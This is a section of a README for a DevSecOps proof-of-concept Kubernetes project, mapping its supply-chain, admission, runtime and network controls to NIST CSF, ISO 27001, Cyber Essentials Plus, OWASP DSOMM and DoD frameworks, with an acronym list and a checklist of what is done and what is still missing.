| **Deploy** | ArgoCD GitOps (audit trail, selfHeal); Kyverno + PSS two-gate admission; Kyverno verifyImages blocks unsigned images; RBAC |
| **Run** | Falco eBPF runtime detection; Istio mTLS STRICT + AuthorizationPolicy; NetworkPolicy default-deny; OWASP ZAP DAST (every push + weekly); PLG observability; AlertManager rules |

**What's here that most PoCs skip:** keyless supply chain signing with a Kyverno admission
gate, two-layer policy admission (API server PSS + webhook Kyverno), eBPF runtime detection
with Falco, DAST in CI, full SBOM + SLSA provenance chain, ESO secrets management with a
GCP Secret Manager production path, CIS Kubernetes Benchmark via kube-bench, and OpenSSF
Scorecard with a live badge.

**Honest gaps vs. a production deployment:**
- Penetration test by an independent third party (required for PCI-DSS QSA engagement)
- Live GCP deployment (`terraform plan` is validated but `terraform apply` costs money)
- Full ISMS governance layer for ISO 27001 certification (risk register, SoA, management reviews, internal audits)

---

## DevSecOps framework alignment

Every control in this PoC maps to at least one recognised framework. This section shows
the mapping — useful for demonstrating that the practices here are not ad hoc.

---

### NIST Cybersecurity Framework 2.0

| Function | Controls in this PoC |
|---|---|
| **Govern** | PCI-DSS requirements mapped in `docs/pci-dss-mapping.md`; RBAC policies in `k8s/rbac/rbac.yaml`; ArgoCD signed Git commits as immutable change log |
| **Identify** | syft SBOM (software asset inventory); Terraform IaC (infrastructure asset register); Trivy secret scan (credential exposure detection); `SECURITY.md` vulnerability disclosure policy |
| **Protect** | Kyverno + PSS (policy enforcement at two independent gates); NetworkPolicy default-deny; Istio mTLS STRICT (encryption in transit); KMS 90-day key rotation (encryption at rest); Workload Identity (no long-lived GCP credentials); cosign keyless signing + Kyverno admission gate (supply chain integrity) |
| **Detect** | Prometheus + Grafana (metrics-based anomaly detection); Loki + Promtail (30-day log retention); Falco eBPF (runtime syscall threat detection); AlertManager PrometheusRules (automated alerting) |
| **Respond** | ArgoCD `selfHeal` (automated configuration drift recovery); AlertManager routing (incident notification); RabbitMQ dead-letter queue (payment event failure capture and replay) |
| **Recover** | PodDisruptionBudget `minAvailable: 1` (service survives node drain); HPA (automatic capacity recovery under load); RabbitMQ PDB `minAvailable: 2` (quorum resilience); rolling update strategy (zero-downtime deployment) |

---

### ISO 27001:2022 — Annex A control mapping

| Control | Implementation |
|---|---|
| **A.5.7** Threat intelligence | Trivy CVE feed + Snyk advisory database; Falco community rule library |
| **A.5.23** ICT supply chain security | cosign keyless signing + SLSA provenance; Kyverno `verifyImages` admission gate; action versions pinned (not `@master`) |
| **A.5.36** Compliance with policies | Kyverno ClusterPolicies as machine-readable, version-controlled policy |
| **A.8.4** Access to source code | Branch protection on `master`; ArgoCD RBAC; `k8s/rbac/rbac.yaml` |
| **A.8.8** Technical vulnerability management | Trivy (container + IaC) + Snyk + CodeQL in CI gate; Dependabot weekly automated PRs |
| **A.8.9** Configuration management | Kustomize overlays (declarative diff-based); Helm versioned releases; Terraform state |
| **A.8.15** Logging | Loki + Promtail (30-day retention); Prometheus metrics (30-day retention); ArgoCD audit log |
| **A.8.16** Monitoring activities | Grafana dashboards; AlertManager PrometheusRules; Falco runtime event stream |
| **A.8.20** Network security | NetworkPolicy default-deny-all + explicit allow; GKE private cluster (Terraform); VPC private subnets |
| **A.8.21** Security of network services | Istio mTLS STRICT (mutual certificate auth); Cloud Armor WAF OWASP rule set (Terraform) |
| **A.8.24** Cryptography | KMS envelope encryption; TLS enforced at Istio sidecar; 90-day key rotation (`terraform/kms.tf`); `prevent_destroy` lifecycle guard |
| **A.8.25** Secure development lifecycle | Full CI pipeline: lint → SAST → SCA → DAST → sign → GitOps deploy |
| **A.8.28** Secure coding | CodeQL SAST + Copilot Autofix; Snyk DeepCode AI; Trivy misconfig scan |
| **A.8.29** Security testing in dev and acceptance | Trivy image scan (every build); OWASP ZAP DAST (every push to master + weekly cron) |

---

### UK Cyber Essentials Plus — five technical controls

Cyber Essentials Plus is the UK government's baseline cyber security certification scheme
(NCSC). The five controls and their implementation:

| Control | Implementation |
|---|---|
| **Firewalls** | NetworkPolicy default-deny-all + explicit namespaced ingress allow (`k8s/base/networkpolicy.yaml`); Cloud Armor WAF with OWASP managed rule set (`terraform/vpc.tf`) |
| **Secure Configuration** | Kyverno policies (non-root, no-privileged, resource limits required); Pod Security Standards `restricted` profile; `securityContext` hardening (`runAsNonRoot`, `readOnlyRootFilesystem`, `capabilities: drop: ALL`, `seccompProfile: RuntimeDefault`) |
| **User Access Control** | RBAC with least-privilege roles (`k8s/rbac/rbac.yaml`); Workload Identity (no key-based GCP service account credentials); Istio `AuthorizationPolicy` (identity-based, not network-location-based) |
| **Malware Protection** | Falco eBPF behavioural detection (shell spawning, file writes, network scans); Trivy + Snyk image scanning for known-malicious packages; Kyverno blocks unsigned images |
| **Patch Management** | Trivy scans for CVEs on every CI run; Dependabot automated weekly PRs for GitHub Actions + Docker + pip + Terraform + npm; GKE managed node auto-upgrades (Terraform); image tags pinned to digests in production |

---

### OWASP DevSecOps Maturity Model (DSOMM)

DSOMM defines four dimensions with increasing maturity levels. This PoC reaches Level 3
("defined") across all dimensions:

| Dimension | Practice | Implementation |
|---|---|---|
| **Culture and Organisation** | Security findings surfaced in developer workflow | GitHub Security tab: SARIF upload from ZAP, Trivy, CodeQL — findings appear inline on PRs |
| **Culture and Organisation** | Vulnerability disclosure policy | `SECURITY.md` (private disclosure via GitHub Security Advisories) |
| **Build and Deployment** | Security integrated into CI | lint → Snyk → CodeQL → Trivy → cosign → deploy; build fails on CRITICAL/HIGH |
| **Build and Deployment** | Signed artefacts | cosign keyless (GitHub OIDC); SBOM as OCI attestation; SLSA provenance |
| **Build and Deployment** | Admission gate for signed images | Kyverno `verifyImages` — unsigned images blocked at deploy time |
| **Build and Deployment** | Automated dependency updates | Dependabot weekly PRs (`.github/dependabot.yml`) |
| **Test and Verification** | SAST | CodeQL + Snyk DeepCode AI |
| **Test and Verification** | SCA / dependency analysis | Snyk + Trivy (CVE database + license scanning) |
| **Test and Verification** | DAST | OWASP ZAP baseline scan — SARIF to Security tab (`category: zap-baseline`) + HTML artifact; `workflow_dispatch` enables manual re-runs |
| **Test and Verification** | Infrastructure scanning | Snyk IaC + Trivy misconfig scan (Terraform + K8s manifests) |
| **Information Gathering** | Centralised log aggregation | Loki + Promtail; 30-day retention (PCI-DSS Req 10) |
| **Information Gathering** | Metrics and alerting | Prometheus + Grafana + AlertManager; 7 alert rules covering HPA, pods, RabbitMQ |
| **Information Gathering** | Runtime threat detection | Falco modern\_ebpf driver; syscall-level detection with gRPC event stream |

---

### DoD DevSecOps Reference Design

The DoD DevSecOps Reference Design (v2.0) defines the "Continuous ATO" model — security
evidence is generated continuously by the pipeline rather than at a point-in-time audit.
This PoC demonstrates the same pattern:

| DoD Pattern | This PoC |
|---|---|
| Hardened container image | `nginxinc/nginx-unprivileged:1.27-alpine` + full `securityContext` hardening |
| Artefact signing + SBOM | cosign keyless + syft SPDX/CycloneDX + SLSA provenance |
| Policy as Code | Kyverno ClusterPolicies + Pod Security Standards (two independent gates) |
| Zero-trust networking | Istio mTLS STRICT + NetworkPolicy default-deny + `AuthorizationPolicy` |
| Continuous monitoring | Falco eBPF + Prometheus + Loki + AlertManager |
| GitOps audit trail | ArgoCD + GPG-signed commits (Ed25519 key) |
| IaC with Binary Authorization | Terraform GKE + `binary_authorization: PROJECT_SINGLETON_POLICY_ENFORCE` |

---

## Acronym appendix

| Acronym | Meaning |
|---|---|
| ACK | Acknowledgement (AMQP message confirmation pattern) |
| AMQP | Advanced Message Queuing Protocol |
| API | Application Programming Interface |
| ATO | Authority to Operate (DoD continuous security authorisation model) |
| CE+ | Cyber Essentials Plus (UK NCSC certification scheme) |
| CI/CD | Continuous Integration / Continuous Delivery |
| CIDR | Classless Inter-Domain Routing |
| CIS | Center for Internet Security |
| CodeQL | Code Query Language (GitHub SAST engine) |
| CRD | Custom Resource Definition |
| CSF | Cybersecurity Framework (NIST) |
| CVE | Common Vulnerabilities and Exposures |
| DAST | Dynamic Application Security Testing |
| DLQ | Dead-Letter Queue |
| DNS | Domain Name System |
| DoD | Department of Defense (US) |
| DSOMM | DevSecOps Maturity Model (OWASP) |
| eBPF | Extended Berkeley Packet Filter (Linux kernel observability technology) |
| GCP | Google Cloud Platform |
| GHCR | GitHub Container Registry |
| GKE | Google Kubernetes Engine |
| GitOps | Git-based Operations (declarative cluster state managed from a Git source of truth) |
| GPG | GNU Privacy Guard |
| HA | High Availability |
| HPA | Horizontal Pod Autoscaler |
| HTTP | Hypertext Transfer Protocol |
| HTTPS | HTTP Secure |
| IAM | Identity and Access Management |
| IaC | Infrastructure as Code |
| ISMS | Information Security Management System (ISO 27001 scope) |
| JSON | JavaScript Object Notation |
| kind | Kubernetes in Docker (local cluster tool) |
| KMS | Key Management Service |
| K8s | Kubernetes |
| LogQL | Loki Query Language |
| mTLS | Mutual Transport Layer Security |
| NCSC | National Cyber Security Centre (UK) |
| NIST | National Institute of Standards and Technology (US) |
| OCI | Open Container Initiative |
| OIDC | OpenID Connect |
| OWASP | Open Web Application Security Project |
| PCI-DSS | Payment Card Industry Data Security Standard |
| PDB | PodDisruptionBudget |
| PKI | Public Key Infrastructure |
| PLG | Prometheus + Loki + Grafana (observability stack) |
| PoC | Proof of Concept |
| PSS | Pod Security Standards |
| QSA | Qualified Security Assessor (PCI-DSS auditor) |
| RBAC | Role-Based Access Control |
| SARIF | Static Analysis Results Interchange Format |
| SBOM | Software Bill of Materials |
| SCA | Software Composition Analysis |
| SLSA | Supply-chain Levels for Software Artifacts |
| SAST | Static Application Security Testing |
| SOC | Security Operations Centre |
| SPDX | Software Package Data Exchange |
| TLS | Transport Layer Security |
| VPC | Virtual Private Cloud |
| VU | Virtual User (k6 load test concurrency unit) |
| WAF | Web Application Firewall |
| YAML | YAML Ain't Markup Language |
| ZAP | Zed Attack Proxy (OWASP DAST tool) |

---

## Are we done? Honest completion checklist

### What is fully implemented ✅

| Area | Evidence |
|---|---|
| Container orchestration | `kind-config.yaml`, `k8s/base/`, `k8s/overlays/` |
| Kustomize base + overlays | `k8s/base/kustomization.yaml`, `k8s/overlays/dev/`, `k8s/overlays/prod/` |
| Helm — authored chart + consumed | `charts/nginx-app/`, all platform installs via Helm |
| GitOps (ArgoCD) | `argocd/application.yaml` — prune + selfHeal |
| GitHub Actions CI/CD | `.github/workflows/ci.yaml`, `dast.yaml`, `supply-chain.yaml` |
| Google Cloud Build | `cloudbuild.yaml` |
| SAST | CodeQL (Python) + Semgrep (PHP + Python, `p/php` + `p/python` rulesets) + Snyk DeepCode; all findings in GitHub Security tab |
| SCA | Snyk + Trivy (CVE + licence scanning) |
| DAST | OWASP ZAP (`.github/workflows/dast.yaml`, `.zap/rules.tsv`); SARIF uploaded to GitHub Security tab + HTML artifact |
| IaC scanning | Trivy misconfig + Snyk IaC (Terraform + K8s manifests) |
| Secret detection | Trivy FS, GitHub Push Protection, pre-commit gitleaks (`.pre-commit-config.yaml`) |
| Supply chain integrity | cosign keyless, syft SBOM (SPDX + CycloneDX), SLSA provenance |
| Admission gates (two-layer) | Kyverno ClusterPolicies + Pod Security Standards |
| Kyverno policy unit tests | `kyverno/tests/unit-test.yaml` — 6 assertions, no cluster needed |
| Image signature admission | `kyverno/policies/verify-images.yaml` |
| Runtime security | Falco modern\_ebpf (`make falco`) |
| Service mesh / mTLS | `istio/peer-authentication.yaml` (STRICT), `istio/authorization-policy.yaml` |
| Network segmentation | `k8s/base/networkpolicy.yaml`, `k8s/rabbitmq/networkpolicy.yaml` |
| RBAC | `k8s/rbac/rbac.yaml`, `make rbac-audit` |
| Observability | Prometheus + Grafana + Loki + Promtail + AlertManager |
| Alerting | `monitoring/alert-rules.yaml` — 7 PrometheusRules |
| HPA autoscaling | `k8s/base/hpa.yaml` + k6 load test demo |
| PodDisruptionBudget | `k8s/base/pdb.yaml`, `k8s/rabbitmq/pdb.yaml` |
| Async payment flow | `k8s/rabbitmq/` — 3-node quorum, DLQ, delivery\_mode=2, ACK |
| Terraform (GCP/GKE) | `terraform/` — private cluster, VPC, Cloud Armor WAF, KMS, Binary Authorization, Secret Manager |
| Secrets management | `k8s/secrets/` — ESO + OpenBao locally; `gcp-secret-store.yaml` + `terraform/secrets.tf` for GCP SM in production |
| Local dev | `Tiltfile`, `.devcontainer/devcontainer.json`, GitHub Codespaces |
| PCI-DSS mapping | `docs/pci-dss-mapping.md` |
| Framework alignment | NIST CSF, ISO 27001, CE+, DSOMM, DoD DevSecOps |
| A/B attack demos | `demo/` — vulnerable images, unsigned deploy, insecure Python + PHP |
| Automated dependency updates | `.github/dependabot.yml` |
| Vulnerability disclosure | `SECURITY.md` |
| Acronym appendix | Above |

### Honest gaps vs. a live production deployment

These are not gaps in the PoC — they are honest answers to "what would you add next?"
in an interview, which is better than pretending everything is complete.

| Gap | Why it matters | How to close it |
|---|---|---|
| ~~**External Secrets Operator / Vault**~~ | ✅ Implemented — ESO + OpenBao locally, GCP Secret Manager in production (`k8s/secrets/`, `terraform/secrets.tf`) | Done |
| **Third-party penetration test** | PCI-DSS Req 11 explicitly requires external pen testing by a QSA. Automated scanning is not a substitute | Engage an accredited QSA firm |
| ~~**kube-bench (CIS Kubernetes Benchmark)**~~ | ✅ Implemented — `k8s/kube-bench/kube-bench-job.yaml`, run with `make kube-bench` (ISO 27001 A.8.9, PCI-DSS Req 2.2) | Done |
| ~~**OpenSSF Scorecard**~~ | ✅ Implemented — `.github/workflows/scorecard.yml`, badge in README, SARIF uploaded to Security tab | Done |
| **Live GCP deployment** | `terraform plan` is validated but never applied — Binary Authorization, Cloud Armor, and Workload Identity are not exercised against a real cluster | Apply against a real GCP project (adds cost) |

### What sets this apart from a typical DevOps PoC

Most interview PoCs show one or two of these. This one shows all of them:

1. **Supply chain end-to-end** — not just building an image but signing it, generating an SBOM, attaching SLSA provenance, and blocking unsigned images at admission time with Kyverno
2. **Two independent admission gates** — PSS at the API server (no webhook) and Kyverno (admission webhook) — one misconfiguration doesn't mean a policy bypass
3. **Policy unit tests** — Kyverno policies are tested before deployment, same as application code
4. **Runtime detection** — Falco eBPF catches behaviour that admission policies cannot (post-compromise activity inside a running container)
5. **SAST across two languages with three scanners** — CodeQL (Python), Semgrep (PHP + Python), and Snyk run in parallel. PHP findings from `vulnerable_payment.php` appear in the GitHub Security tab via Semgrep since CodeQL does not support PHP. Same CWE classes, different runtimes — demonstrates that these are architectural patterns, not language-specific bugs.
6. **Three-layer secret defence** — pre-commit hook → GitHub Push Protection → Trivy CI scan (demonstrated live during development)
7. **Proper secrets management** — ESO + OpenBao locally with identical ExternalSecret manifests swapped for GCP Secret Manager in production via Workload Identity; only the ClusterSecretStore changes
8. **CIS Benchmark + OpenSSF Scorecard** — compliance checks that most PoCs skip entirely: kube-bench validates control-plane hardening; Scorecard evaluates 18 supply-chain health dimensions with a public badge
9. **Framework-mapped controls** — every control maps to NIST CSF, ISO 27001 Annex A, UK Cyber Essentials Plus, OWASP DSOMM, and DoD DevSecOps Reference Design
